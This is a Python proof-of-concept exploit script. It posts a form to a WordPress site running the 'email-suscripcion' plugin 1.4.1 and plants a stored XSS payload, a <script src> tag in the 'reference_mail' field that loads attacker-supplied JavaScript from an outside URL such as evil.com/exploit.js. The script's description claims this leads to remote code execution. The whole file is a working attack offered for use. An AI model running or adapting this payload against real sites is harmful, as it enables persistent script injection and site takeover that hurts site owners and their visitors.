#!/usr/bin/env python

import requests
import argparse
import urllib

def make_request():
    data = "name_mail=" + args.name + "&email_mail=" + urllib.quote(args.emailaddr) + "&reference_mail=<script src=" + args.exploiturl + "></script>futbol live scores!&emailing-send=Subscribe"
    print data
    # request needs a content-type header in order to properly submit the form
    headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r = requests.post(args.url, data=data, headers=headers)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proof of concept remote code execution via stored XSS in https://wordpress.org/plugins/email-suscripcion/ version 1.4.1')
    parser.add_argument('--url', help='The URL of the site with the form to target (ex. http://example.com/)', dest="url",  required="True")
    parser.add_argument('-e', help='URL to the exploit javascript file (ex. http://evil.com/exploit.js)', dest="exploiturl", required="True")
    parser.add_argument('-n', help='Name to use for the form', dest="name", required="True")
    parser.add_argument('-a', help='Email address to use for the form', dest="emailaddr", required="True")
    
    args = parser.parse_args()
    make_request()


